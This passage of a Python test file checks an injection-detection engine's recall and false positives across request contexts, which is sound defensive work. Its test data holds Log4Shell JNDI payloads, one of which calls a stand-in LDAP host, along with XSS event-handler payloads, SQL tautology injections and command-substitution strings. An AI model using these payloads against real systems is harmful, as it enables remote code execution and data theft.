    "and the ${amount} template placeholder are character-identical to that "
    "attack shape as raw query-string or path-segment values, so they are "
    "flagged there too, and stay correctly benign in request_body, where "
    "the branch never fires. Resolved toward recall: detecting $(id)/$(w)/"
    "$(who)/$(groups)/$(set)/${IFS}-shaped command substitution outweighs "
    "these five documented, disclosed false positives"
)

_DOLLAR_SUBSTITUTION_DISCLOSED_FALSE_POSITIVES = [
    pytest.param(
        "cmd_injection_jquery_selector_bare_id_call",
        "$(id).addClass('active');",
        id="jquery_selector_bare_id_call",
    ),
]


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "case_id, payload", _DOLLAR_SUBSTITUTION_DISCLOSED_FALSE_POSITIVES
)
@pytest.mark.parametrize("context", ["query_param", "url_path"])
async def test_dollar_substitution_disclosed_false_positive_detected(
    case_id: str, payload: str, context: str
) -> None:
    result = await _PRODUCTION_MANAGER.detect(
        content=payload, ip_address="203.0.113.9", context=context
    )
    assert result["is_threat"] is True, (
        f"{case_id} expected to be a disclosed false positive in {context}: "
        f"{_AMBIGUOUS_DOLLAR_SUBSTITUTION_QUERY_URL_KNOWN_FP_REASON}"
    )


_DOLLAR_SUBSTITUTION_FORMER_FALSE_POSITIVES = [
    pytest.param("export PATH=${HOME}/bin", id="shell_docs_var_expansion"),
    pytest.param(
        "Set the amount with ${amount} in the template.", id="template_dollar_brace_var"
    ),
    pytest.param(
        "The Makefile references $(CC) and $(CFLAGS) for the compiler.",
        id="template_makefile_variable",
    ),
    pytest.param(
        "$('#submit-button').on('click', handleSubmit);",
        id="jquery_selector_hash_id_call",
    ),
]


@pytest.mark.asyncio
@pytest.mark.parametrize("payload", _DOLLAR_SUBSTITUTION_FORMER_FALSE_POSITIVES)
@pytest.mark.parametrize("context", ["query_param", "url_path"])
async def test_dollar_substitution_former_false_positive_is_clean(
    payload: str, context: str
) -> None:
    result = await _PRODUCTION_MANAGER.detect(
        content=payload, ip_address="203.0.113.9", context=context
    )
    assert result["is_threat"] is False


_LOG4SHELL_URL_PATH_BONUS_PAYLOADS = [
    pytest.param("${lower:j}ndi", id="log4shell_obfuscated_lower_bare"),
    pytest.param("${::-j}ndi", id="log4shell_obfuscated_default_value_bare"),
    pytest.param(
        "${${lower:j}ndi:ldap://evil.example/a}",
        id="log4shell_obfuscated_nested_full_exploit",
    ),
]


@pytest.mark.asyncio
@pytest.mark.parametrize("payload", _LOG4SHELL_URL_PATH_BONUS_PAYLOADS)
async def test_log4shell_obfuscated_payload_detected_in_url_path(
    payload: str,
) -> None:
    result = await _PRODUCTION_MANAGER.detect(
        content=payload, ip_address="203.0.113.9", context="url_path"
    )
    assert result["is_threat"] is True


_VAR_ASSIGNMENT_PREFIXED_SHELL_DASH_C_DISCLOSED_FALSE_POSITIVES = [
    pytest.param(
        "cmd_injection_ci_yaml_env_prefixed_run_step",
        "steps:\n  - run: |\n      FOO=bar BAZ=qux bash -c 'echo hi'",
        id="ci_yaml_run_step",
    ),
    pytest.param(
        "cmd_injection_crontab_env_prefixed_backup_line",
        "5 4 * * * root\nPATH=/usr/bin:/bin bash -c 'do_backup.sh'",
        id="crontab_backup_line",
    ),
    pytest.param(
        "cmd_injection_makefile_env_prefixed_recipe",
        "target:\n\tFOO=1 BAR=2 bash -c 'do_thing'",
        id="makefile_recipe",
    ),
]


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "case_id, payload",
    _VAR_ASSIGNMENT_PREFIXED_SHELL_DASH_C_DISCLOSED_FALSE_POSITIVES,
)
async def test_var_assignment_prefixed_shell_dash_c_disclosed_false_positive_detected(
    case_id: str, payload: str
) -> None:
    result = await _PRODUCTION_MANAGER.detect(
        content=payload, ip_address="198.51.100.4", context="request_body"
    )
    assert result["is_threat"] is True, (
        f"{case_id} expected to be a disclosed false positive: "
        f"{_ENV_VAR_PREFIXED_SHELL_DASH_C_CI_CONFIG_KNOWN_FP_REASON}"
    )
    hit_categories = {str(threat.get("category")) for threat in result["threats"]}
    assert "cmd_injection" in hit_categories, (
        f"{case_id} expected to fire cmd_injection specifically, got {hit_categories}"
    )


_EVENT_HANDLER_ALLOWLIST_COVERAGE_CLIFF_PAYLOADS = [
    pytest.param('<body onactivate="alert(1)">', id="onactivate"),
    pytest.param('<input onfocusin="alert(1)">', id="onfocusin"),
    pytest.param('<div onmousewheel="alert(1)">', id="onmousewheel"),
    pytest.param('<marquee onbounce="alert(1)">', id="onbounce"),
    pytest.param(
        '<div onwebkitfullscreenchange="alert(1)">', id="onwebkitfullscreenchange"
    ),
    pytest.param('<x onafterscriptexecute="alert(1)">', id="onafterscriptexecute"),
    pytest.param('<x onbeforescriptexecute="alert(1)">', id="onbeforescriptexecute"),
]


@pytest.mark.asyncio
@pytest.mark.parametrize("payload", _EVENT_HANDLER_ALLOWLIST_COVERAGE_CLIFF_PAYLOADS)
async def test_xss_event_handler_detected_when_absent_from_prior_allowlist(
    payload: str,
) -> None:
    result = await _PRODUCTION_MANAGER.detect(
        content=payload, ip_address="203.0.113.9", context="request_body"
    )
    assert result["is_threat"] is True
    hit_categories = {str(threat.get("category")) for threat in result["threats"]}
    assert "xss" in hit_categories


_EVENT_HANDLER_ALLOWLIST_STAYS_BOUNDED_PAYLOADS = [
    pytest.param(
        '<staff-badge oncall = "true">On call</staff-badge>',
        id="custom_attribute_oncall_spaced_equals",
    ),
    pytest.param(
        '<div onboarding="true">Welcome</div>',
        id="custom_attribute_onboarding_unspaced",
    ),
    pytest.param(
        '<div oncustomthing="alert(1)">',
        id="invented_word_not_a_real_handler",
    ),
    pytest.param(
        '<div onpointerlockchange="alert(1)">',
        id="real_idl_property_not_html_reflected",
    ),
]


@pytest.mark.asyncio
@pytest.mark.parametrize("payload", _EVENT_HANDLER_ALLOWLIST_STAYS_BOUNDED_PAYLOADS)
async def test_xss_event_handler_allowlist_does_not_admit_non_handler_names(
    payload: str,
) -> None:
    result = await _PRODUCTION_MANAGER.detect(
        content=payload, ip_address="198.51.100.4", context="request_body"
    )
    assert result["is_threat"] is False


_SQLI_TAUTOLOGY_DETECTED_PAYLOADS = [
    pytest.param("1 OR 1=1--", id="numeric_tautology_comment"),
    pytest.param("1 OR 1=1", id="numeric_tautology_bare"),
    pytest.param("1 or 1=1", id="numeric_tautology_lower"),
    pytest.param("5 OR 5=5", id="numeric_tautology_five"),
    pytest.param("1 AND 1=1", id="numeric_tautology_and"),
    pytest.param("id=1 OR 1=1--", id="numeric_tautology_param"),
    pytest.param("WHERE id = %s;OR1=1--", id="placeholder_pct_s_tautology"),
    pytest.param("WHERE id = ?;OR1=1--", id="placeholder_qmark_tautology"),
    pytest.param("WHERE id = $1;OR1=1--", id="placeholder_dollar_tautology"),
]


@pytest.mark.asyncio
@pytest.mark.parametrize("payload", _SQLI_TAUTOLOGY_DETECTED_PAYLOADS)
async def test_sqli_tautology_detected_regardless_of_placeholder_or_literal(
    payload: str,
) -> None:
    result = await _PRODUCTION_MANAGER.detect(
        content=payload, ip_address="198.51.100.4", context="request_body"
    )
    assert result["is_threat"] is True
    hit_categories = {str(threat.get("category")) for threat in result["threats"]}
    assert "sqli" in hit_categories


_SQLI_WHERE_CLAUSE_NOT_FLAGGED_PAYLOADS = [
    pytest.param("SELECT id FROM users WHERE id = 5", id="int_compare"),
    pytest.param(
        "SELECT name, email FROM customers WHERE active = 1", id="bool_compare"
    ),
    pytest.param(
        '{"query":"SELECT count(*) FROM events WHERE day = 3"}', id="json_wrapped"
    ),
    pytest.param(
        "SELECT id FROM sessions WHERE status = 1 OR verified = 2",
        id="two_distinct_columns",
    ),
    pytest.param(
        "SELECT id FROM sessions WHERE active OR admin", id="two_bare_columns"
    ),
]


@pytest.mark.asyncio
@pytest.mark.parametrize("payload", _SQLI_WHERE_CLAUSE_NOT_FLAGGED_PAYLOADS)
async def test_sqli_where_clause_literal_value_not_flagged(payload: str) -> None:
    result = await _PRODUCTION_MANAGER.detect(
        content=payload, ip_address="198.51.100.4", context="request_body"
    )
    assert result["is_threat"] is False


_CONTEXT_SWEEP = ("query_param", "header", "url_path", "request_body")

_KNOWN_CONTEXT_RECALL_FLOORS: dict[tuple[str, str], tuple[int, str]] = {
    ("sqli", "header"): (
        36,
        "_SQLI_ORDER_BY_STRONG_RE (_suspatterns_sources.py), registered in "
        "DETECTION_URL_DECODED_VIEW_PATTERN_SOURCES "
        "(_suspatterns_shell_sources.py) under the widened _CTX_SQLI, "
        "recovers 2 of the 4 corpus entries the narrowed "
        "_SQLI_ORDER_BY_TERMINATOR_RE cost: sqli_order_by_enum "
        '("1\' ORDER BY 1--", quote prefix and -- suffix both qualify) '
        'and sqli_order_by_string_end_no_comment ("1\' ORDER BY 3", '
        "quote prefix qualifies). 2 remain undetected on header/url_path: "
        "sqli_embedded_order_by_with_trailing_header "
        '("sort=ORDER BY 1\\nX-Extra-Header: value") is preceded by "=", '
        "not a quote/paren/digit/comment-opener, and followed by a "
        "newline, not a comment terminator, so neither strong-shape "
        "condition matches it; sqli_standalone_order_by_control "
        '("ORDER BY 1") has no prefix or suffix marker at all, the same '
        "bare shape as the excluded benign 'order by 3'/'X-Sort: order "
        "by 3', so it is structurally indistinguishable from that "
        "excluded shape by design and cannot be recovered without "
        "reintroducing the false positive",
    ),
    ("sqli", "url_path"): (
        36,
        "identical tradeoff and identical 2 remaining corpus entries as "
        "('sqli', 'header') above; the strong-shape condition is "
        "context-independent",
    ),
}

_KNOWN_CONTEXT_FP_CEILINGS: dict[tuple[str, str], tuple[int, str]] = {
    ("template", "header"): (
        1,
        "the same 1 remaining corpus entry "
        "_SSTI_HASH_BRACE_CALL_SYNTAX_KNOWN_FP_REASON already discloses on "
        "request_body/query_param/url_path (template_fp_call_branch_helper_format); "
        "the other 5 template FPs this ceiling used to cover "
        "(template_fp_date_curly_brace, template_fp_date_hash_brace, "
        "template_fp_call_branch_format_x, template_fp_call_branch_round_filter, "
        "template_fp_call_branch_map_arrow) were closed structurally (empty-parens "
        "call-branch gate on {{ }}, ISO-date exclusion on both brace styles); "
        "widening template to header extends an already-accepted class to one "
        "more context rather than introducing a new one",
    ),
    ("file_inclusion", "header"): (
        3,
        "the same 3 remaining corpus entries "
        "_RFI_TARGET_EXTENSION_DOWNLOAD_LINK_KNOWN_FP_REASON already discloses on "
        "query_param/url_path/request_body (file_inclusion_benign_readme_txt_link, "
        "file_inclusion_benign_docs_readme_txt_link, "
        "file_inclusion_benign_terms_txt_link); the other 3 "
        "(file_inclusion_benign_installer_sh_link, "
        "file_inclusion_benign_docker_installer_sh_link, "
        "file_inclusion_benign_cgi_search_link) were closed by dropping .sh/.cgi "
        "from the RFI target-extension alternation (0 malicious corpus entries "
        "depend on either); widening file_inclusion to header extends an "
        "already-accepted class to one more context rather than introducing a "
        "new one",
    ),
    ("file_upload", "query_param"): (
        1,
        "the same corpus entry already disclosed on request_body/header "
        "(file_upload_prose_ticket_dangerous_filename_spaced_equals); "
        "widening file_upload to query_param extends an already-accepted "
        "class to one more context rather than introducing a new one",
    ),
    ("cmd_injection", "query_param"): (
        20,
        "the already-disclosed glued-backtick/dollar-substitution ambiguous "
        "shape class: _AMBIGUOUS_BACKTICK_INJECTION_CONTEXTS in "
        "_suspatterns_shell_sources.py deliberately resolves an ambiguous "
        "glued-backtick or dollar-substitution match as a hit only in "
        "query_param/url_path, by design, and 5 of the 8 corpus entries "
        "behind this delta are the exact cases "
        "test_dollar_substitution_disclosed_false_positive_detected already "
        "pins as disclosed (cmd_injection_shell_docs_var_expansion, "
        "template_benign_dollar_brace_var, template_benign_makefile_variable, "
        "cmd_injection_jquery_selector_bare_id_call, "
        "cmd_injection_jquery_selector_hash_id_call); the other 3 are the "
        "sibling glued-kebab-identifier shapes governed by the same "
        "ambiguous-context set "
        "(cmd_injection_glued_kebab_identifier_header_forward, "
        "cmd_injection_glued_kebab_identifier_config_well_known, "
        "cmd_injection_glued_plausible_token_ref_user_list)",
    ),
}


def _context_sweep_table(
    malicious_hits: dict[str, dict[str, int]],
    malicious_total_by_category: dict[str, int],
    benign_hits: dict[str, dict[str, int]],
) -> str:
    lines = [
        "PER-CONTEXT DETECTION TABLE",
        "",
        "recall (detected/total) by category x context:",
    ]
    for category in sorted(ALL_DETECTION_CATEGORIES):
        total = malicious_total_by_category.get(category, 0)
        cells = [
            f"{context}={malicious_hits[context].get(category, 0)}/{total}"
            for context in _CONTEXT_SWEEP
        ]
        lines.append(f"  {category:16} " + "  ".join(cells))
    lines.append("")
    lines.append("false-positive attribution by category x context:")
    flagged_categories = sorted(
        {category for context_hits in benign_hits.values() for category in context_hits}
    )
    for category in flagged_categories:
        cells = [
            f"{context}={benign_hits[context].get(category, 0)}"
            for context in _CONTEXT_SWEEP
        ]
        lines.append(f"  {category:16} " + "  ".join(cells))
    return "\n".join(lines)


@pytest.mark.redos_timing
@pytest.mark.asyncio
async def test_detection_recall_and_false_positive_hold_across_contexts() -> None:
    malicious_hits: dict[str, dict[str, int]] = {
        context: {} for context in _CONTEXT_SWEEP
    }
    malicious_total_by_category: dict[str, int] = {}
    undocumented_context_misses: list[str] = []
    for malicious_case in MALICIOUS_CORPUS:
        malicious_total_by_category[malicious_case.category] = (
            malicious_total_by_category.get(malicious_case.category, 0) + 1
        )
        detector = _DETECTORS[malicious_case.detector]
        for context in _CONTEXT_SWEEP:
            result = await detector.detect(
                content=malicious_case.payload,
                ip_address="203.0.113.9",
                context=context,
            )
            hit_categories = (
                {str(threat.get("category")) for threat in result["threats"]}
                if result["is_threat"]
                else set()
            )
            if malicious_case.category in hit_categories:
                malicious_hits[context][malicious_case.category] = (
                    malicious_hits[context].get(malicious_case.category, 0) + 1
                )
            elif (
                context != "request_body"
                and context in CATEGORY_CONTEXT_MAP[malicious_case.category]
                and not malicious_case.known_gap_reason
                and not any(
                    malicious_case.case_id in reason
                    for (category, _ctx), (_floor, reason) in (
                        _KNOWN_CONTEXT_RECALL_FLOORS.items()
                    )
                    if category == malicious_case.category
                )
            ):
                undocumented_context_misses.append(
                    f"{malicious_case.case_id} in {context}"
                )

    benign_hits: dict[str, dict[str, int]] = {context: {} for context in _CONTEXT_SWEEP}
    undocumented_context_false_positives: list[str] = []
    for benign_case in BENIGN_CORPUS:
        detector = _DETECTORS[benign_case.detector]
        for context in _CONTEXT_SWEEP:
            result = await detector.detect(
                content=benign_case.payload, ip_address="198.51.100.4", context=context
            )
            if not result["is_threat"]:
                continue
            fired_categories = {
                str(threat.get("category")) for threat in result["threats"]
            }
            if not benign_case.known_false_positive_reason and not (
                context != "request_body"
                and any(
                    benign_case.case_id in reason
                    for (category, _ctx), (_ceiling, reason) in (
                        _KNOWN_CONTEXT_FP_CEILINGS.items()
                    )
                    if category in fired_categories
                )
            ):
                undocumented_context_false_positives.append(
                    f"{benign_case.case_id} in {context}"
                )
            for category in fired_categories:
                benign_hits[context][category] = (
                    benign_hits[context].get(category, 0) + 1
                )

    table = _context_sweep_table(
        malicious_hits, malicious_total_by_category, benign_hits
    )
    print(table)

    assert not undocumented_context_misses, (
        "undetected malicious item(s) in a context inside their category's "
        f"set with no reason naming that context rule: {undocumented_context_misses}\n"
        f"{table}"
    )
    assert not undocumented_context_false_positives, (
        "benign item(s) fired in a context with no known_false_positive_reason: "
        f"{undocumented_context_false_positives}\n{table}"
    )

    recall_regressions = []
    for category in sorted(ALL_DETECTION_CATEGORIES):
        baseline = malicious_hits["request_body"].get(category, 0)
        for context in _CONTEXT_SWEEP:
            if context == "request_body":
                continue
            if context not in CATEGORY_CONTEXT_MAP[category]:
                continue
            actual = malicious_hits[context].get(category, 0)
            floor, reason = _KNOWN_CONTEXT_RECALL_FLOORS.get(
                (category, context), (baseline, "")
            )
            if actual < floor:
                recall_regressions.append(
                    f"{category} in {context}: {actual} below floor {floor} "
                    f"(request_body baseline {baseline}) {reason}"
                )
    assert not recall_regressions, "\n".join(recall_regressions) + "\n\n" + table

    fp_regressions = []
    flagged_categories = sorted(
        {category for context_hits in benign_hits.values() for category in context_hits}
    )
    for category in flagged_categories:
        baseline = benign_hits["request_body"].get(category, 0)
        for context in _CONTEXT_SWEEP:
            if context == "request_body":
                continue
            actual = benign_hits[context].get(category, 0)
            ceiling, reason = _KNOWN_CONTEXT_FP_CEILINGS.get(
                (category, context), (baseline, "")
            )
            if actual > ceiling:
                fp_regressions.append(
                    f"{category} in {context}: {actual} above ceiling {ceiling} "
                    f"(request_body baseline {baseline}) {reason}"
                )
    assert not fp_regressions, "\n".join(fp_regressions) + "\n\n" + table
